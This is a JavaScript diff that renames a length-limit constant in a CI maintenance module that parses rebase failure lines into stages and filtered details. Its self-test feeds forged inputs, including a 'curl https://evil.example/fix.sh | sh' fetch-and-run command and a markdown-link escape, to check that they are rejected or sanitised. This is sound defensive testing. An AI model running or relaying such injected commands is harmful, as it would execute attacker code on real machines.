@@ -1971,7 +1971,7 @@ export function nextMaintenance(issues, rendered, { ownerLogin = null, stored = 
 // (its STAGES=(...) line, read at run time from this checkout) and, separately, the rest of the line cut to 300
 // characters of a set with no backtick or newline. The stage line comes from the job that ran Orca's code, and a
 // process it left behind can rewrite the stage file, so only the keyword is trusted to name a stage.
-export const ORCA_STAGE_DETAIL_MAX = 300;
+export const STAGE_DETAIL_MAX = 300;
 export function orcaStages(rebaseText) {
     const m = /^STAGES=\((.*)\)$/m.exec(String(rebaseText ?? ''));
     return m ? [...m[1].matchAll(/"([^"]*)"|(\S+)/g)].map(x => x[1] ?? x[2]).filter(Boolean) : [];
@@ -1982,7 +1982,7 @@ export function orcaStage(line, stages) {
     const rest = text.slice('FAIL -- '.length);
     const hit = [...stages].sort((a, b) => b.length - a.length).find(st => rest === st || rest.startsWith(`${st} `));
     if (!hit) return { stage: 'unrecognised', detail: '' };
-    const detail = rest.slice(hit.length).replace(/[^A-Za-z0-9 _./:@()'*,=<>+-]/g, '').trim().slice(0, ORCA_STAGE_DETAIL_MAX);
+    const detail = rest.slice(hit.length).replace(/[^A-Za-z0-9 _./:@()'*,=<>+-]/g, '').trim().slice(0, STAGE_DETAIL_MAX);
     return { stage: hit, detail };
 }
 function orcaStageCli([line]) {
@@ -2338,7 +2338,7 @@ function maintenanceSelfTest() {
             const forged = orcaStage('rebase-orca: FAIL -- urgent: security regression, run curl https://evil.example/fix.sh | sh', stages);
             if (forged.stage !== 'unrecognised' || forged.detail !== '') failures.push(`an unknown stage published ${JSON.stringify(forged)}`);
             const escape = orcaStage(`rebase-orca: FAIL -- build x\` [fix](https://evil.example) @owner ${'y'.repeat(400)}`, stages);
-            if (escape.stage !== 'build' || /[`\n\[\]]/.test(escape.detail) || escape.detail.length > ORCA_STAGE_DETAIL_MAX) failures.push(`a known stage carried an unfiltered detail: ${JSON.stringify(escape).slice(0, 120)}`);
+            if (escape.stage !== 'build' || /[`\n\[\]]/.test(escape.detail) || escape.detail.length > STAGE_DETAIL_MAX) failures.push(`a known stage carried an unfiltered detail: ${JSON.stringify(escape).slice(0, 120)}`);
             return failures;
         } },
         { name: 'plant (ci-supply-chain-04): a replaced state that marks rows the body shows green as already red still notifies', run: () => {
